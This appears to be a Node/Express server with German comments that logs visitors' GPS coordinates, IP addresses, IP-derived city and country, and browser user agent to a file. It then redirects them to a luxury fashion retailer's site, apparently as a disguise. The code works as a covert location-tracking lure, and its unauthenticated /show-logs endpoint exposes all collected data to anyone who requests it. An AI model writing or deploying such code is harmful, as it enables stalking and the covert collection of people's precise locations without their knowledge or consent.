const express = require('express');
const path = require('path');
const fs = require('fs');
const geoip = require('geoip-lite');
const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.set('trust proxy', true);
app.use(express.static('public'));

// GPS-Daten speichern und anzeigen
app.get('/log-gps', (req, res) => {
    const { lat, lon, accuracy } = req.query;
    const ip = req.ip.split(',')[0]; // Erste IP bei Render
    const geo = geoip.lookup(ip);
    const userAgent = req.headers['user-agent'];

    // Log-Eintrag formatieren
    const logEntry = {
        timestamp: new Date().toISOString(),
        ip: ip,
        location: geo ? `${geo.city}, ${geo.country}` : "Unknown",
        coordinates: lat && lon ? `${lat}, ${lon} (±${accuracy}m)` : "Blocked",
        device: userAgent
    };

    // In Datei schreiben
    fs.appendFileSync('gps.log', JSON.stringify(logEntry) + '\n');

    // Für Live-Anzeige (optional)
    if (req.query.show === "true") {
        const logs = fs.readFileSync('gps.log', 'utf8');
        return res.send(`<pre>${logs}</pre>`);
    }

    res.sendStatus(204);
});

// Weiterleitung
app.get('/redirect', (req, res) => {
    res.redirect('https://de.loropiana.com');
});

// Live-Log-Anzeige (NUR FÜR DICH!)
app.get('/show-logs', (req, res) => {
    try {
        const logs = fs.readFileSync('gps.log', 'utf8');
        res.send(`<pre>${logs.replace(/\n/g, '<br>')}</pre>`);
    } catch {
        res.send("Noch keine Logs vorhanden.");
    }
});

app.listen(PORT, () => console.log(`✅ Tracking aktiv auf Port ${PORT}`));
